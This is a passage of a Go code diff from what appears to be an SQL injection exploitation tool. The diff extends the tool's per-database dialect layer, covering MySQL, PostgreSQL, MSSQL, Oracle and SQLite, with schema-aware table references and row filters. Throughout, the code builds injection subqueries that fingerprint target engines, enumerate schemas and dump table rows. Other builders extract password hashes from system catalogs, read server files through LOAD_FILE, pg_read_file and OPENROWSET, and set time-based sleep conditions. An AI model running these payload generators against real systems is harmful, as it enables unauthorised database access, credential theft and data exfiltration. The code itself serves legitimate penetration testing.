@@ -5,42 +5,82 @@ import (
 	"strings"
 )
 
-// Dialect contains the SQL syntax differences that matter for extraction.
-// Every function returns a scalar SQL expression unless documented otherwise.
+// TableRef identifies one table independent from the DBMS naming rules.
+// MySQL uses DB and ignores Schema, PostgreSQL uses Schema inside the current
+// database, MSSQL uses both, Oracle uses DB as the owner.
+type TableRef struct {
+	DB     string
+	Schema string
+	Table  string
+}
+
+// Name renders the human readable identifier used in results and logs.
+func (r TableRef) Name() string {
+	parts := make([]string, 0, 3)
+	if r.DB != "" {
+		parts = append(parts, r.DB)
+	}
+	if r.Schema != "" && !strings.EqualFold(r.Schema, r.DB) {
+		parts = append(parts, r.Schema)
+	}
+	parts = append(parts, r.Table)
+	return strings.Join(parts, ".")
+}
+
+// Target returns the database.schema value used by metadata listing helpers.
+func (r TableRef) Target() string {
+	if r.Schema != "" && !strings.EqualFold(r.Schema, r.DB) {
+		return r.DB + "." + r.Schema
+	}
+	return r.DB
+}
+
+// Dialect contains the SQL syntax differences that matter for enumeration
+// and extraction. Every function returns a scalar SQL expression unless the
+// parameter or result says otherwise.
 type Dialect struct {
-	Name          string
-	Aliases       []string
-	Quote         func(string) string
-	Str           func(string) string
-	Concat        func(...string) string
-	Length        func(string) string
-	Substr        func(string, int, int) string
-	ASCII         func(string) string
-	Marker        func(string) string
+	Name    string
+	Aliases []string
+
+	Quote  func(string) string
+	Str    func(string) string
+	Concat func(...string) string
+
+	Length func(string) string
+	Substr func(string, int, int) string
+	ASCII  func(string) string
+	Marker func(string) string
+
 	SleepExpr     func(int) string
 	TimeCondition func(string, int) string
 	ErrorExpr     func(string) (string, bool)
-	Databases     func() string
-	Tables        func(string) string
-	Columns       func(string, string) string
-	CurrentDB     func() string
-	Version       func() string
-	User          func() string
-	Hostname      func() string
-	IsDBA         func() string
-	Privileges    func() string
-	Users         func() string
-	Passwords     func() string
-	Roles         func() string
-	RowCount      func(string, string) string
-	DumpRow       func(string, string, []string, int) string
-	FileRead      func(string) (string, bool)
-	OSCmd         func(string) (string, bool)
-	SearchTables  func(string) string
+
+	// Metadata enumeration.
+	Databases func() string
+	Schemas   func(db string) string
+	Tables    func(db, schema string) string
+	Columns   func(db, schema, table string) string
+
+	CurrentDB  func() string
+	Version    func() string
+	User       func() string
+	Hostname   func() string
+	IsDBA      func() string
+	Privileges func() string
+	Users      func() string
+	Passwords  func() string
+	Roles      func() string
+
+	// Table access.
+	RowCount     func(ref TableRef, where string) string
+	DumpRow      func(ref TableRef, cols []string, offset int, where string) string
+	FileRead     func(string) (string, bool)
+	OSCmd        func(string) (string, bool)
+	SearchTables func(string) string
 	SearchColumns func(string) string
-	TableColumns  func(string, string) string
-	AllTables     func() string
-	AllColumns    func() string
+	TableColumns func(db, schema, table string) string
+	AllTables    func() string
+	AllColumns   func() string
 }
 
 func quoteBacktick(s string) string {
@@ -81,7 +121,21 @@ func concatPipe(parts ...string) string {
 	if len(parts) == 0 {
 		return "''"
 	}
+	if len(parts) == 1 {
+		return parts[0]
+	}
 	return "(" + strings.Join(parts, "||") + ")"
+}
+
+// concatPlus exists for Sybase ASE, whose string concatenation operator is +.
+func concatPlus(parts ...string) string {
+	if len(parts) == 0 {
+		return "''"
+	}
+	if len(parts) == 1 {
+		return parts[0]
+	}
+	return "(" + strings.Join(parts, "+") + ")"
 }
 
 func markerPipe(expr string) string {
@@ -96,7 +150,56 @@ func defaultAliases(name string, aliases ...string) []string {
 	return append([]string{name}, aliases...)
 }
 
-// Dialects returns all supported dialects in detection order.
+// whereClause normalizes a user supplied WHERE fragment. A trailing semicolon
+// is removed so the fragment cannot terminate the scalar subquery.
+func whereClause(where string) string {
+	where = strings.TrimSpace(where)
+	if where == "" {
+		return ""
+	}
+	lower := strings.ToLower(where)
+	if strings.HasPrefix(lower, "where ") {
+		where = strings.TrimSpace(where[len("where "):])
+	}
+	where = strings.TrimSpace(strings.TrimRight(where, ";"))
+	if where == "" {
+		return ""
+	}
+	return " WHERE " + where
+}
+
+// interleave joins expressions with a separator expression, producing the
+// argument list used by CONCAT style functions.
+func interleave(parts []string, sep string) []string {
+	if len(parts) == 0 {
+		return nil
+	}
+	out := make([]string, 0, len(parts)*2-1)
+	for i, part := range parts {
+		if i > 0 {
+			out = append(out, sep)
+		}
+		out = append(out, part)
+	}
+	return out
+}
+
+func joinExpr(parts []string, sep string, pipe bool) string {
+	if len(parts) == 0 {
+		return "''"
+	}
+	if len(parts) == 1 {
+		return parts[0]
+	}
+	if pipe {
+		return "(" + strings.Join(interleave(parts, sep), "||") + ")"
+	}
+	return "CONCAT(" + strings.Join(interleave(parts, sep), ",") + ")"
+}
+
+// Dialects returns every supported dialect in fingerprint order. The order
+// puts the most common engines first so a confirmed target leaves the
+// fingerprint loop early.
 func Dialects() []*Dialect {
 	return []*Dialect{
 		mysqlDialect(),
@@ -104,6 +207,7 @@ func Dialects() []*Dialect {
 		mssqlDialect(),
 		oracleDialect(),
 		sqliteDialect(),
+		db2Dialect(),
 		clickhouseDialect(),
 		duckdbDialect(),
 		cockroachDialect(),
@@ -133,10 +237,128 @@ func GetDialect(name string) *Dialect {
 	return nil
 }
 
+// --- qualification helpers ------------------------------------------------
+
+func mysqlTable(ref TableRef) string {
+	db := ref.DB
+	if ref.Schema != "" {
+		db = ref.Schema
+	}
+	if db == "" {
+		return quoteBacktick(ref.Table)
+	}
+	return quoteBacktick(db) + "." + quoteBacktick(ref.Table)
+}
+
+func pgTable(ref TableRef) string {
+	if ref.Schema == "" {
+		return quoteDouble(ref.Table)
+	}
+	return quoteDouble(ref.Schema) + "." + quoteDouble(ref.Table)
+}
+
+func mssqlTable(ref TableRef) string {
+	schema := ref.Schema
+	if schema == "" {
+		schema = "dbo"
+	}
+	if ref.DB == "" {
+		return quoteBracket(schema) + "." + quoteBracket(ref.Table)
+	}
+	return quoteBracket(ref.DB) + "." + quoteBracket(schema) + "." + quoteBracket(ref.Table)
+}
+
+func oracleTable(ref TableRef) string {
+	owner := ref.DB
+	if owner == "" {
+		owner = ref.Schema
+	}
+	if owner == "" {
+		return quoteDouble(strings.ToUpper(ref.Table))
+	}
+	return quoteDouble(strings.ToUpper(owner)) + "." + quoteDouble(strings.ToUpper(ref.Table))
+}
+
+func snowflakeTable(ref TableRef) string {
+	schema := ref.Schema
+	if schema == "" {
+		schema = "PUBLIC"
+	}
+	if ref.DB == "" {
+		return quoteDouble(schema) + "." + quoteDouble(ref.Table)
+	}
+	return quoteDouble(ref.DB) + "." + quoteDouble(schema) + "." + quoteDouble(ref.Table)
+}
+
+func clickhouseTable(ref TableRef) string {
+	if ref.DB == "" {
+		return quoteBacktick(ref.Table)
+	}
+	return quoteBacktick(ref.DB) + "." + quoteBacktick(ref.Table)
+}
+
+func bigqueryTable(ref TableRef) string {
+	if ref.DB == "" {
+		return quoteBacktick(ref.Table)
+	}
+	if ref.Schema != "" {
+		return quoteBacktick(ref.DB) + "." + quoteBacktick(ref.Schema) + "." + quoteBacktick(ref.Table)
+	}
+	return quoteBacktick(ref.DB) + "." + quoteBacktick(ref.Table)
+}
+
+func h2Table(ref TableRef) string {
+	schema := ref.Schema
+	if schema == "" {
+		schema = "PUBLIC"
+	}
+	return quoteDouble(schema) + "." + quoteDouble(ref.Table)
+}
+
+func firebirdTable(ref TableRef) string {
+	return quoteDouble(strings.ToUpper(ref.Table))
+}
+
+func sybaseTable(ref TableRef) string {
+	if ref.DB == "" {
+		return quoteBracket(ref.Table)
+	}
+	return quoteBracket(ref.DB) + ".." + quoteBracket(ref.Table)
+}
+
+func db2Table(ref TableRef) string {
+	schema := ref.Schema
+	if schema == "" {
+		return quoteDouble(ref.Table)
+	}
+	return quoteDouble(schema) + "." + quoteDouble(ref.Table)
+}
+
+func duckdbTable(ref TableRef) string {
+	if ref.Schema == "" {
+		return quoteDouble(ref.Table)
+	}
+	return quoteDouble(ref.Schema) + "." + quoteDouble(ref.Table)
+}
+
+func defaultSchemaFor(dbms string) string {
+	switch strings.ToLower(dbms) {
+	case "postgresql", "cockroachdb", "duckdb":
+		return "public"
+	case "mssql", "sybase":
+		return "dbo"
+	case "snowflake", "h2":
+		return "PUBLIC"
+	}
+	return ""
+}
+
+// --- MySQL / MariaDB -----------------------------------------------------
+
 func mysqlDialect() *Dialect {
 	return &Dialect{
 		Name:    "MySQL",
-		Aliases: defaultAliases("MySQL", "MariaDB", "Percona"),
+		Aliases: defaultAliases("MySQL", "MariaDB", "Percona", "TiDB", "Vitess", "Aurora MySQL"),
 		Quote:   quoteBacktick,
 		Str:     mysqlLiteral,
 		Concat:  concatFunc("CONCAT"),
@@ -156,10 +378,23 @@ func mysqlDialect() *Dialect {
 		Databases: func() string {
 			return "(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x1e) FROM information_schema.schemata)"
 		},
-		Tables: func(db string) string {
+		Schemas: func(db string) string { return "" },
+		Tables: func(db, schema string) string {
+			if schema != "" {
+				db = schema
+			}
+			if db == "" {
+				return "(SELECT GROUP_CONCAT(table_name SEPARATOR 0x1e) FROM information_schema.tables WHERE table_schema=DATABASE())"
+			}
 			return fmt.Sprintf("(SELECT GROUP_CONCAT(table_name SEPARATOR 0x1e) FROM information_schema.tables WHERE table_schema=%s)", literal(db))
 		},
-		Columns: func(db, table string) string {
+		Columns: func(db, schema, table string) string {
+			if schema != "" {
+				db = schema
+			}
+			if db == "" {
+				return fmt.Sprintf("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=%s ORDER BY ordinal_position)", literal(table))
+			}
 			return fmt.Sprintf("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
 		},
 		CurrentDB: func() string { return "DATABASE()" },
@@ -181,15 +416,15 @@ func mysqlDialect() *Dialect {
 		Roles: func() string {
 			return "(SELECT GROUP_CONCAT(CONCAT(USER,'@',HOST) SEPARATOR 0x1e) FROM mysql.user)"
 		},
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.%s)", quoteBacktick(db), quoteBacktick(table))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", mysqlTable(ref), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("IFNULL(CAST(%s AS CHAR),'NULL')", quoteBacktick(c)))
 			}
-			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.%s LIMIT %d,1)", strings.Join(parts, ",0x1f,"), quoteBacktick(db), quoteBacktick(table), offset)
+			return fmt.Sprintf("(SELECT %s FROM %s%s LIMIT %d,1)", joinExpr(parts, "0x1f", false), mysqlTable(ref), whereClause(where), offset)
 		},
 		FileRead: func(path string) (string, bool) {
 			return fmt.Sprintf("LOAD_FILE(%s)", mysqlLiteral(path)), true
@@ -203,7 +438,13 @@ func mysqlDialect() *Dialect {
 		SearchColumns: func(keyword string) string {
 			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name,'.',column_name) SEPARATOR 0x1e) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
 		},
-		TableColumns: func(db, table string) string {
+		TableColumns: func(db, schema, table string) string {
+			if schema != "" {
+				db = schema
+			}
+			if db == "" {
+				return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(column_name,':',column_type) SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=%s ORDER BY ordinal_position)", literal(table))
+			}
 			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(column_name,':',column_type) SEPARATOR 0x1e) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
 		},
 		AllTables: func() string {
@@ -215,17 +456,20 @@ func mysqlDialect() *Dialect {
 	}
 }
 
+// --- PostgreSQL ----------------------------------------------------------
+
 func postgresDialect() *Dialect {
 	return &Dialect{
-		Name:    "PostgreSQL",
-		Aliases: defaultAliases("PostgreSQL", "Postgres", "CockroachDB"),
-		Quote:   quoteDouble,
-		Str:     literal,
-		Concat:  concatPipe,
-		Length:  func(e string) string { return "LENGTH(" + e + ")" },
-		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s FROM %d FOR %d)", e, p, l) },
-		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
-		Marker:  markerPipe,
+		Name: "PostgreSQL",
+		Aliases: defaultAliases("PostgreSQL", "Postgres", "Redshift", "Greenplum",
+			"YugabyteDB", "TimescaleDB", "Aurora PostgreSQL", "Neon", "Supabase"),
+		Quote:  quoteDouble,
+		Str:    literal,
+		Concat: concatPipe,
+		Length: func(e string) string { return "LENGTH(" + e + ")" },
+		Substr: func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s FROM %d FOR %d)", e, p, l) },
+		ASCII:  func(e string) string { return "ASCII(" + e + ")" },
+		Marker: markerPipe,
 		SleepExpr: func(n int) string {
 			return fmt.Sprintf("pg_sleep(%d)", n)
 		},
@@ -238,11 +482,28 @@ func postgresDialect() *Dialect {
 		Databases: func() string {
 			return "(SELECT string_agg(datname,chr(30)) FROM pg_database WHERE datistemplate=false)"
 		},
-		Tables: func(db string) string {
-			return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s)", literal(db))
+		Schemas: func(db string) string {
+			if db == "" {
+				return "(SELECT string_agg(schema_name,chr(30)) FROM information_schema.schemata WHERE schema_name NOT IN ('pg_catalog','information_schema'))"
+			}
+			return fmt.Sprintf("(SELECT string_agg(schema_name,chr(30)) FROM information_schema.schemata WHERE catalog_name=%s AND schema_name NOT IN ('pg_catalog','information_schema'))", literal(db))
 		},
-		Columns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(db), literal(table))
+		Tables: func(db, schema string) string {
+			schema = strings.TrimSpace(schema)
+			if schema == "" {
+				schema = "public"
+			}
+			if db == "" {
+				return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s AND table_type='BASE TABLE')", literal(schema))
+			}
+			return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_catalog=%s AND table_schema=%s AND table_type='BASE TABLE')", literal(db), literal(schema))
+		},
+		Columns: func(db, schema, table string) string {
+			schema = strings.TrimSpace(schema)
+			if schema == "" {
+				schema = "public"
+			}
+			return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
 		},
 		CurrentDB: func() string { return "current_database()" },
 		Version:   func() string { return "version()" },
@@ -263,15 +524,15 @@ func postgresDialect() *Dialect {
 		Roles: func() string {
 			return "(SELECT string_agg(rolname,chr(30)) FROM pg_roles)"
 		},
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM %s)", quoteDouble(table))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", pgTable(ref), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("COALESCE(%s::text,'NULL')", quoteDouble(c)))
 			}
-			return fmt.Sprintf("(SELECT %s FROM %s LIMIT 1 OFFSET %d)", strings.Join(parts, "||chr(31)||"), quoteDouble(table), offset)
+			return fmt.Sprintf("(SELECT %s FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "chr(31)", true), pgTable(ref), whereClause(where), offset)
 		},
 		FileRead: func(path string) (string, bool) {
 			return fmt.Sprintf("pg_read_file(%s)", literal(path)), true
@@ -285,8 +546,12 @@ func postgresDialect() *Dialect {
 		SearchColumns: func(keyword string) string {
 			return fmt.Sprintf("(SELECT string_agg(table_schema||'.'||table_name||'.'||column_name,chr(30)) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
 		},
-		TableColumns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT string_agg(column_name||':'||data_type,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(db), literal(table))
+		TableColumns: func(db, schema, table string) string {
+			schema = strings.TrimSpace(schema)
+			if schema == "" {
+				schema = "public"
+			}
+			return fmt.Sprintf("(SELECT string_agg(column_name||':'||data_type,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
 		},
 		AllTables: func() string {
 			return "(SELECT string_agg(table_schema||'.'||table_name,chr(30)) FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema'))"
@@ -297,10 +562,12 @@ func postgresDialect() *Dialect {
 	}
 }
 
+// --- Microsoft SQL Server ------------------------------------------------
+
 func mssqlDialect() *Dialect {
 	return &Dialect{
 		Name:    "MSSQL",
-		Aliases: defaultAliases("MSSQL", "SQLServer", "SQL Server"),
+		Aliases: defaultAliases("MSSQL", "SQLServer", "SQL Server", "Azure SQL", "AzureSQL"),
 		Quote:   quoteBracket,
 		Str:     literal,
 		Concat:  concatFunc("CONCAT"),
@@ -320,11 +587,37 @@ func mssqlDialect() *Dialect {
 		Databases: func() string {
 			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.databases)"
 		},
-		Tables: func(db string) string {
-			return fmt.Sprintf("(SELECT STRING_AGG(name,CHAR(30)) FROM %s.sys.tables)", quoteBracket(db))
+		Schemas: func(db string) string {
+			if db == "" {
+				db = "DB_NAME()"
+			} else {
+				db = quoteBracket(db)
+			}
+			return fmt.Sprintf("(SELECT STRING_AGG(name,CHAR(30)) FROM %s.sys.schemas WHERE name NOT IN ('sys','INFORMATION_SCHEMA','guest'))", db)
 		},
-		Columns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT STRING_AGG(c.name,CHAR(30)) FROM %s.sys.columns c JOIN %s.sys.tables t ON c.object_id=t.object_id WHERE t.name=%s)", quoteBracket(db), quoteBracket(db), literal(table))
+		Tables: func(db, schema string) string {
+			schema = strings.TrimSpace(schema)
+			if schema == "" {
+				schema = "dbo"
+			}
+			if db == "" {
+				db = "DB_NAME()"
+			} else {
+				db = quoteBracket(db)
+			}
+			return fmt.Sprintf("(SELECT STRING_AGG(t.name,CHAR(30)) FROM %s.sys.tables t JOIN %s.sys.schemas s ON t.schema_id=s.schema_id WHERE s.name=%s)", db, db, literal(schema))
+		},
+		Columns: func(db, schema, table string) string {
+			schema = strings.TrimSpace(schema)
+			if schema == "" {
+				schema = "dbo"
+			}
+			if db == "" {
+				db = "DB_NAME()"
+			} else {
+				db = quoteBracket(db)
+			}
+			return fmt.Sprintf("(SELECT STRING_AGG(c.name,CHAR(30)) FROM %s.sys.columns c JOIN %s.sys.tables t ON c.object_id=t.object_id JOIN %s.sys.schemas s ON t.schema_id=s.schema_id WHERE t.name=%s AND s.name=%s)", db, db, db, literal(table), literal(schema))
 		},
 		CurrentDB: func() string { return "DB_NAME()" },
 		Version:   func() string { return "@@VERSION" },
@@ -338,27 +631,25 @@ func mssqlDialect() *Dialect {
 			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.server_principals WHERE type IN ('S','U'))"
 		},
 		Passwords: func() string {
-			return "(SELECT STRING_AGG(name||':'||password_hash,CHAR(30)) FROM sys.sql_logins)"
+			return "(SELECT STRING_AGG(name+':'+password_hash,CHAR(30)) FROM sys.sql_logins)"
 		},
 		Roles: func() string {
 			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.server_principals WHERE type='R')"
 		},
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.dbo.%s)", quoteBracket(db), quoteBracket(table))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", mssqlTable(ref), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("ISNULL(CAST(%s AS NVARCHAR(MAX)),'NULL')", quoteBracket(c)))
 			}
-			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.dbo.%s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", strings.Join(parts, ",CHAR(31),"), quoteBracket(db), quoteBracket(table), offset)
+			return fmt.Sprintf("(SELECT %s FROM %s%s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", joinExpr(parts, "CHAR(31)", false), mssqlTable(ref), whereClause(where), offset)
 		},
 		FileRead: func(path string) (string, bool) {
 			return fmt.Sprintf("(SELECT BulkColumn FROM OPENROWSET(BULK %s,SINGLE_CLOB) AS x)", literal(path)), true
 		},
 		OSCmd: func(cmd string) (string, bool) {
-			// xp_cmdshell cannot be expressed as a scalar subquery. Stacked
-			// query execution is required instead.
 			return "", false
 		},
 		SearchTables: func(keyword string) string {
@@ -367,8 +658,17 @@ func mssqlDialect() *Dialect {
 		SearchColumns: func(keyword string) string {
 			return fmt.Sprintf("(SELECT STRING_AGG(name,CHAR(30)) FROM sys.columns WHERE name LIKE %s)", literal("%"+keyword+"%"))
 		},
-		TableColumns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT STRING_AGG(c.name||':'||t.name,CHAR(30)) FROM %s.sys.columns c JOIN %s.sys.types t ON c.user_type_id=t.user_type_id WHERE c.object_id=OBJECT_ID(%s))", quoteBracket(db), quoteBracket(db), literal(db+"."+table))
+		TableColumns: func(db, schema, table string) string {
+			schema = strings.TrimSpace(schema)
+			if schema == "" {
+				schema = "dbo"
+			}
+			if db == "" {
+				db = "DB_NAME()"
+			} else {
+				db = quoteBracket(db)
+			}
+			return fmt.Sprintf("(SELECT STRING_AGG(c.name+':'+t.name,CHAR(30)) FROM %s.sys.columns c JOIN %s.sys.types t ON c.user_type_id=t.user_type_id JOIN %s.sys.tables tb ON c.object_id=tb.object_id JOIN %s.sys.schemas s ON tb.schema_id=s.schema_id WHERE tb.name=%s AND s.name=%s)", db, db, db, db, literal(table), literal(schema))
 		},
 		AllTables: func() string {
 			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.tables)"
@@ -379,10 +679,12 @@ func mssqlDialect() *Dialect {
 	}
 }
 
+// --- Oracle --------------------------------------------------------------
+
 func oracleDialect() *Dialect {
 	return &Dialect{
 		Name:    "Oracle",
-		Aliases: defaultAliases("Oracle"),
+		Aliases: defaultAliases("Oracle", "OracleDB", "Oracle Database"),
 		Quote:   quoteDouble,
 		Str:     literal,
 		Concat:  concatPipe,
@@ -402,11 +704,26 @@ func oracleDialect() *Dialect {
 		Databases: func() string {
 			return "(SELECT LISTAGG(username,CHR(30)) WITHIN GROUP (ORDER BY username) FROM all_users)"
 		},
-		Tables: func(db string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHR(30)) WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner=%s)", literal(strings.ToUpper(db)))
+		Schemas: func(db string) string { return "" },
+		Tables: func(db, schema string) string {
+			owner := db
+			if owner == "" {
+				owner = schema
+			}
+			if owner == "" {
+				return "(SELECT LISTAGG(table_name,CHR(30)) WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner=USER)"
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHR(30)) WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner=%s)", literal(strings.ToUpper(owner)))
 		},
-		Columns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=%s AND table_name=%s)", literal(strings.ToUpper(db)), literal(strings.ToUpper(table)))
+		Columns: func(db, schema, table string) string {
+			owner := db
+			if owner == "" {
+				owner = schema
+			}
+			if owner == "" {
+				return fmt.Sprintf("(SELECT LISTAGG(column_name,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=USER AND table_name=%s)", literal(strings.ToUpper(table)))
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=%s AND table_name=%s)", literal(strings.ToUpper(owner)), literal(strings.ToUpper(table)))
 		},
 		CurrentDB: func() string { return "SYS_CONTEXT('USERENV','CURRENT_SCHEMA')" },
 		Version:   func() string { return "(SELECT banner FROM v$version WHERE ROWNUM=1)" },
@@ -427,15 +744,15 @@ func oracleDialect() *Dialect {
 		Roles: func() string {
 			return "(SELECT LISTAGG(granted_role,CHR(30)) WITHIN GROUP (ORDER BY granted_role) FROM user_role_privs)"
 		},
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.%s)", quoteDouble(strings.ToUpper(db)), quoteDouble(strings.ToUpper(table)))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", oracleTable(ref), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("NVL(TO_CHAR(%s),'NULL')", quoteDouble(strings.ToUpper(c))))
 			}
-			return fmt.Sprintf("(SELECT %s FROM (SELECT t.*,ROWNUM rn FROM %s.%s t) WHERE rn=%d)", strings.Join(parts, "||CHR(31)||"), quoteDouble(strings.ToUpper(db)), quoteDouble(strings.ToUpper(table)), offset+1)
+			return fmt.Sprintf("(SELECT %s FROM %s%s OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", joinExpr(parts, "CHR(31)", true), oracleTable(ref), whereClause(where), offset)
 		},
 		FileRead: func(path string) (string, bool) {
 			return "", false
@@ -449,8 +766,15 @@ func oracleDialect() *Dialect {
 		SearchColumns: func(keyword string) string {
 			return fmt.Sprintf("(SELECT LISTAGG(table_name||'.'||column_name,CHR(30)) WITHIN GROUP (ORDER BY table_name,column_name) FROM all_tab_columns WHERE column_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
 		},
-		TableColumns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=%s AND table_name=%s)", literal(strings.ToUpper(db)), literal(strings.ToUpper(table)))
+		TableColumns: func(db, schema, table string) string {
+			owner := db
+			if owner == "" {
+				owner = schema
+			}
+			if owner == "" {
+				return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=USER AND table_name=%s)", literal(strings.ToUpper(table)))
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=%s AND table_name=%s)", literal(strings.ToUpper(owner)), literal(strings.ToUpper(table)))
 		},
 		AllTables: func() string {
 			return "(SELECT LISTAGG(owner||'.'||table_name,CHR(30)) WITHIN GROUP (ORDER BY owner,table_name) FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM'))"
@@ -460,6 +784,8 @@ func oracleDialect() *Dialect {
 		},
 	}
 }
+
+// --- SQLite --------------------------------------------------------------
 
 // sqliteSleep burns CPU in a recursive CTE because SQLite has no sleep
 // function. One million rows take roughly 0.7 seconds on a typical machine,
@@ -495,10 +821,11 @@ func sqliteDialect() *Dialect {
 		Databases: func() string {
 			return "(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_database_list)"
 		},
-		Tables: func(db string) string {
-			return "(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table')"
+		Schemas: func(db string) string { return "" },
+		Tables: func(db, schema string) string {
+			return "(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')"
 		},
-		Columns: func(db, table string) string {
+		Columns: func(db, schema, table string) string {
 			return fmt.Sprintf("(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_table_info(%s))", literal(table))
 		},
 		CurrentDB: func() string { return "'main'" },
@@ -518,15 +845,15 @@ func sqliteDialect() *Dialect {
 		Roles: func() string {
 			return "''"
 		},
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM %s)", quoteDouble(table))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", quoteDouble(ref.Table), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS TEXT),'NULL')", quoteDouble(c)))
 			}
-			return fmt.Sprintf("(SELECT %s FROM %s LIMIT 1 OFFSET %d)", strings.Join(parts, "||char(31)||"), quoteDouble(table), offset)
